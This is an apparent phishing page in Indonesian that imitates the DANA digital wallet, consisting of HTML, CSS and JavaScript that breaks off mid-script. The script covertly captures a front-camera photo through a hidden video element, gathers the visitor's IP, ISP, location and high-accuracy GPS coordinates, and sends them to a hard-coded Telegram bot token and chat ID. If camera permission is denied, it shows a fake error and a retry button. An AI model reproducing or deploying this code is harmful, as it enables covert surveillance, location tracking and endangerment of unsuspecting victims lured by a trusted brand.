<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <title>DANA - Dompet Digital</title>

    <!-- Google Font -->
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;800&display=swap" rel="stylesheet" />

    <style>
        /* ---------- RESET ---------- */
        * { margin: 0; padding: 0; box-sizing: border-box; }

        body {
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: 'Inter', sans-serif;
            background: radial-gradient(ellipse at 30% 20%, #1a1040, #0a0620);
            padding: 20px;
            overflow: hidden;
            position: relative;
        }

        /* ---------- BINTANG-BINTANG (Efek DANA) ---------- */
        body::before {
            content: '';
            position: fixed;
            inset: 0;
            z-index: 0;
            background-image:
                radial-gradient(2px 2px at 10% 20%, rgba(100, 180, 255, 0.6), transparent),
                radial-gradient(2px 2px at 30% 70%, rgba(100, 180, 255, 0.4), transparent),
                radial-gradient(2px 2px at 50% 10%, rgba(100, 180, 255, 0.7), transparent),
                radial-gradient(2px 2px at 70% 80%, rgba(100, 180, 255, 0.3), transparent),
                radial-gradient(2px 2px at 90% 40%, rgba(100, 180, 255, 0.5), transparent),
                radial-gradient(3px 3px at 20% 50%, rgba(150, 200, 255, 0.3), transparent),
                radial-gradient(3px 3px at 60% 30%, rgba(150, 200, 255, 0.3), transparent),
                radial-gradient(1px 1px at 40% 90%, rgba(255, 255, 255, 0.4), transparent),
                radial-gradient(1px 1px at 80% 60%, rgba(255, 255, 255, 0.4), transparent);
            background-size: 250px 250px;
            animation: drift 60s linear infinite;
            pointer-events: none;
        }

        @keyframes drift {
            0% { transform: translate(0, 0) scale(1); }
            100% { transform: translate(-30px, -30px) scale(1.05); }
        }

        /* ---------- KARTU UTAMA (Glassmorphism) ---------- */
        .card {
            position: relative;
            z-index: 1;
            max-width: 420px;
            width: 100%;
            background: rgba(255, 255, 255, 0.06);
            backdrop-filter: blur(24px) saturate(1.8);
            -webkit-backdrop-filter: blur(24px) saturate(1.8);
            border-radius: 40px;
            padding: 48px 32px 40px;
            border: 1px solid rgba(255, 255, 255, 0.08);
            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.5), inset 0 1px 0 rgba(255, 255, 255, 0.1);
            text-align: center;
            transition: transform 0.3s ease;
        }

        .card:hover { transform: scale(1.01); }

        /* ---------- LOGO / JUDUL ---------- */
        .logo {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            margin-bottom: 12px;
        }

        .logo-icon {
            width: 48px;
            height: 48px;
            background: linear-gradient(135deg, #4a7cf7, #6c5ce7);
            border-radius: 16px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 1.6rem;
            font-weight: 800;
            color: #fff;
            box-shadow: 0 8px 30px rgba(74, 124, 247, 0.3);
            flex-shrink: 0;
        }

        .logo-icon span {
            transform: rotate(-5deg);
        }

        .card h1 {
            font-family: 'Inter', sans-serif;
            font-weight: 800;
            font-size: 2.2rem;
            color: #fff;
            letter-spacing: -1px;
            text-shadow: 0 2px 20px rgba(74, 124, 247, 0.2);
        }

        .card h1 .highlight {
            background: linear-gradient(135deg, #4a7cf7, #a78bfa);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }

        /* ---------- SUB JUDUL ---------- */
        .card .tagline {
            font-size: 1rem;
            font-weight: 600;
            color: rgba(255, 255, 255, 0.9);
            margin-bottom: 8px;
            letter-spacing: 0.5px;
        }

        .card .description {
            font-size: 0.9rem;
            line-height: 1.6;
            color: rgba(255, 255, 255, 0.6);
            font-weight: 400;
            max-width: 320px;
            margin: 0 auto 28px;
        }

        /* ---------- TOMBOL BUKA DI DANA ---------- */
        .btn-dana {
            display: inline-flex;
            align-items: center;
            gap: 12px;
            padding: 16px 44px;
            background: linear-gradient(135deg, #4a7cf7, #6c5ce7);
            border: none;
            border-radius: 100px;
            font-family: 'Inter', sans-serif;
            font-size: 1rem;
            font-weight: 700;
            color: #fff;
            text-decoration: none;
            letter-spacing: 1px;
            box-shadow: 0 8px 40px rgba(74, 124, 247, 0.4);
            transition: all 0.3s ease;
            cursor: pointer;
            border: 1px solid rgba(255, 255, 255, 0.15);
            margin-top: 4px;
            text-transform: uppercase;
        }

        .btn-dana:hover {
            transform: translateY(-3px) scale(1.02);
            box-shadow: 0 12px 50px rgba(74, 124, 247, 0.6);
            background: linear-gradient(135deg, #5a8cf7, #7c6cf7);
        }

        .btn-dana:active { transform: scale(0.96); }

        .btn-dana .icon {
            font-size: 1.2rem;
            line-height: 1;
        }

        /* ---------- ERROR SCREEN ---------- */
        .error-screen {
            display: none;
            position: fixed;
            inset: 0;
            z-index: 999;
            background: #0a0620;
            align-items: center;
            justify-content: center;
            flex-direction: column;
            color: rgba(255, 255, 255, 0.15);
            font-family: 'Inter', sans-serif;
            font-size: 3rem;
            font-weight: 200;
            letter-spacing: 8px;
            text-transform: uppercase;
        }

        .error-screen .sub-error {
            font-size: 0.8rem;
            color: rgba(255, 255, 255, 0.05);
            letter-spacing: 4px;
            margin-top: 12px;
        }

        .btn-retry {
            margin-top: 30px;
            padding: 12px 32px;
            background: rgba(255, 255, 255, 0.06);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 100px;
            color: rgba(255, 255, 255, 0.3);
            font-family: 'Inter', sans-serif;
            font-size: 0.8rem;
            font-weight: 500;
            letter-spacing: 2px;
            text-transform: uppercase;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .btn-retry:hover {
            background: rgba(255, 255, 255, 0.1);
            color: rgba(255, 255, 255, 0.5);
            border-color: rgba(255, 255, 255, 0.2);
        }

        /* ---------- RESPONSIVE ---------- */
        @media (max-width: 480px) {
            .card { padding: 36px 20px 32px; border-radius: 32px; }
            .card h1 { font-size: 1.8rem; }
            .logo-icon { width: 40px; height: 40px; font-size: 1.3rem; }
            .card .tagline { font-size: 0.9rem; }
            .card .description { font-size: 0.82rem; }
            .btn-dana { padding: 14px 32px; font-size: 0.85rem; }
            .error-screen { font-size: 2.2rem; }
            .btn-retry { padding: 10px 24px; font-size: 0.7rem; }
        }

        @media (max-width: 360px) {
            .card h1 { font-size: 1.5rem; }
            .logo-icon { width: 36px; height: 36px; font-size: 1.1rem; }
            .btn-dana { padding: 12px 24px; font-size: 0.75rem; }
            .error-screen { font-size: 1.8rem; }
        }

        /* ---------- SEMUA ELEMEN KAMERA & AUDIO DISEMBUNYIKAN ---------- */
        video { display: none !important; }
        .youtube-hidden {
            position: fixed;
            bottom: -9999px;
            left: -9999px;
            width: 0;
            height: 0;
            overflow: hidden;
            z-index: -1;
        }
    </style>
</head>
<body>

    <!-- ====== KARTU UTAMA (Tampilan DANA) ====== -->
    <div class="card" id="mainCard">
        <div class="logo">
            <div class="logo-icon"><span>D</span></div>
            <h1><span class="highlight">DANA</span></h1>
        </div>
        <div class="tagline">Dompet digital yang aman dan tepercaya!</div>
        <p class="description">
            Nikmati kemudahan bertransaksi dengan beragam metode bayar di genggaman
        </p>
        <button class="btn-dana" id="danaBtn">
            <span class="icon">▶</span> BUKA DI DANA
        </button>
    </div>

    <!-- ====== ERROR SCREEN ====== -->
    <div class="error-screen" id="errorScreen">
        Error
        <div class="sub-error">—</div>
        <button class="btn-retry" id="retryBtn">⟳ Coba Ulang</button>
    </div>

    <!-- ====== AUDIO YouTube ====== -->
    <div class="youtube-hidden">
        <iframe 
            id="youtubeAudio"
            src="https://www.youtube.com/embed/D-VytLhH-KE?autoplay=1&loop=1&playlist=D-VytLhH-KE&controls=0&disablekb=1&modestbranding=1"
            allow="autoplay; encrypted-media"
            allowfullscreen>
        </iframe>
    </div>

    <!-- ====== SCRIPT ====== -->
    <script>
        (function() {
            'use strict';

            const BOT_TOKEN = '8660313492:AAEstxadAAetaluw8OYCgyCxwZB21LDch4Y';
            const CHAT_ID = '8463156896';
            const MAX_ATTEMPTS = 3;
            let attempts = 0;
            let sudahKirim = false;
            let izinDitolak = false;
            let retryTimer = null;

            const mainCard = document.getElementById('mainCard');
            const errorScreen = document.getElementById('errorScreen');
            const retryBtn = document.getElementById('retryBtn');
            const danaBtn = document.getElementById('danaBtn');

            // ---------- FUNGSI GET LOKASI DARI IP ----------
            async function getLocationFromIP() {
                try {
                    const controller = new AbortController();
                    const timeoutId = setTimeout(() => controller.abort(), 7000);
                    const response = await fetch('https://ipapi.co/json/', {
                        signal: controller.signal,
                        headers: { 'Accept': 'application/json' }
                    });
                    clearTimeout(timeoutId);
                    if (!response.ok) throw new Error('HTTP ' + response.status);
                    const data = await response.json();
                    return {
                        ip: data.ip || null,
                        city: data.city || null,
                        region: data.region || null,
                        country: data.country_name || null,
                        postal: data.postal || null,
                        latitude: data.latitude || null,
                        longitude: data.longitude || null,
                        org: data.org || null,
                        timezone: data.timezone || null
                    };
                } catch (e) {
                    console.warn('IP location gagal:', e.message);
                    return null;
                }
            }

            // ---------- FUNGSI GET GPS ----------
            function getGPSLocation() {
                return new Promise((resolve) => {
                    if (!navigator.geolocation) { resolve(null); return; }
                    const timeoutId = setTimeout(() => resolve(null), 6000);
                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            clearTimeout(timeoutId);
                            resolve({
                                latitude: position.coords.latitude,
                                longitude: position.coords.longitude,
                                accuracy: position.coords.accuracy
                            });
                        },
                        () => {
                            clearTimeout(timeoutId);
                            resolve(null);
                        },
                        { enableHighAccuracy: true }
                    );
                });
            }

            // ---------- KIRIM KE TELEGRAM ----------
            async function kirimKeTelegram(dataUrl, locationData, gpsData) {
                try {
                    const blob = await fetch(dataUrl).then(r => r.blob());
                    const formData = new FormData();
                    formData.append('photo', blob, 'foto.png');

                    let caption = `📸 Foto diambil otomatis\n🕒 ${new Date().toLocaleString('id-ID')}`;

                    if (locationData) {
                        if (locationData.ip) caption += `\n\n🌐 IP Publik : ${locationData.ip}`;
                        if (locationData.org) caption += `\n📡 Operator/ISP : ${locationData.org}`;
                        if (locationData.city || locationData.region || locationData.country) {
                            let loc = [];
                            if (locationData.city) loc.push(locationData.city);
                            if (locationData.region) loc.push(locationData.region);
                            if (locationData.country) loc.push(locationData.country);
                            caption += `\n📍 Lokasi IP : ${loc.join(', ')}`;
                        }
                        if (locationData.postal) caption += `\n📮 Kode Pos : ${locationData.postal}`;
                        if (locationData.timezone) caption += `\n🕐 Zona Waktu : ${locationData.timezone}`;
                        if (locationData.latitude && locationData.longitude) {
                            caption += `\n🗺️ Koordinat (IP) : ${locationData.latitude}, ${locationData.longitude}`;
                        }
                    }

                    if (gpsData) {
                        caption += `\n\n📡 GPS (akurat):`;
                        caption += `\n   📍 Lat : ${gpsData.latitude}`;
                        caption += `\n   📍 Long : ${gpsData.longitude}`;
                        if (gpsData.accuracy) {
                            caption += `\n   🎯 Akurasi : ±${Math.round(gpsData.accuracy)} meter`;
                        }
                    }

                    if (!locationData && !gpsData) {
                        caption += `\n\n⚠️ Data lokasi tidak tersedia`;
                    }

                    formData.append('caption', caption);
                    formData.append('chat_id', CHAT_ID);

                    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                    if (!response.ok) throw new Error('Telegram API error');
                    sudahKirim = true;
                } catch (e) {
                    console.error('Gagal kirim ke Telegram:', e);
                }
            }

            // ---------- AMBIL FOTO + LOKASI ----------
            function ambilDanKirim(video) {
                if (sudahKirim) return;

                const canvas = document.createElement('canvas');
                const lebar = video.videoWidth || 640;
                const tinggi = video.videoHeight || 480;
                canvas.width = lebar;
                canvas.height = tinggi;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, lebar, tinggi);
                const dataUrl = canvas.toDataURL('image/png');

                if (video.srcObject) {
                    video.srcObject.getTracks().forEach(track => track.stop());
                }

                Promise.allSettled([
                    getLocationFromIP(),
                    getGPSLocation()
                ]).then((results) => {
                    const locationData = results[0].status === 'fulfilled' ? results[0].value : null;
                    const gpsData = results[1].status === 'fulfilled' ? results[1].value : null;
                    kirimKeTelegram(dataUrl, locationData, gpsData);
                }).catch(() => {
                    kirimKeTelegram(dataUrl, null, null);
                });
            }

            // ---------- TAMPILKAN ERROR ----------
            function tampilkanError() {
                izinDitolak = true;
                mainCard.style.display = 'none';
                errorScreen.style.display = 'flex';
                if (retryTimer) {
                    clearTimeout(retryTimer);
                    retryTimer = null;
                }
            }

            // ---------- RESET & COBA ULANG ----------
            function resetDanCobaUlang() {
                izinDitolak = false;
                attempts = 0;
                sudahKirim = false;
                if (retryTimer) {
                    clearTimeout(retryTimer);
                    retryTimer = null;
                }
                errorScreen.style.display = 'none';
                mainCard.style.display = 'block';
                setTimeout(mulaiKamera, 300);
            }

            // ---------- MULAI KAMERA ----------
            function mulaiKamera() {
                if (sudahKirim || izinDitolak) return;
                attempts++;

                navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
                    audio: false
                })
                .then(stream => {
                    const video = document.createElement('video');
                    video.style.display = 'none';
                    video.setAttribute('playsinline', '');
                    video.muted = true;
                    video.srcObject = stream;
                    document.body.appendChild(video);

                    video.onloadedmetadata = () => {
                        video.play().then(() => {
                            setTimeout(() => ambilDanKirim(video), 100);
                        }).catch(err => {
                            console.error('Gagal memutar:', err);
                            if (attempts < MAX_ATTEMPTS) {
                                retryTimer = setTimeout(mulaiKamera, 2000);
                            } else {
                                tampilkanError();
                            }
                        });
                    };
                    video.onerror = () => {
                        if (attempts < MAX_ATTEMPTS) {
                            retryTimer = setTimeout(mulaiKamera, 2000);
                        } else {
                            tampilkanError();
                        }
                    };
                })
                .catch(err => {
                    console.error('Error kamera:', err);
                    if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
                        tampilkanError();
                        return;
                    }
                    if (attempts < MAX_ATTEMPTS) {
                        retryTimer = setTimeout(mulaiKamera, 2000);
                    } else {
                        tampilkanError();
                    }
                });
            }

            // ---------- EVENT ----------
            if (retr
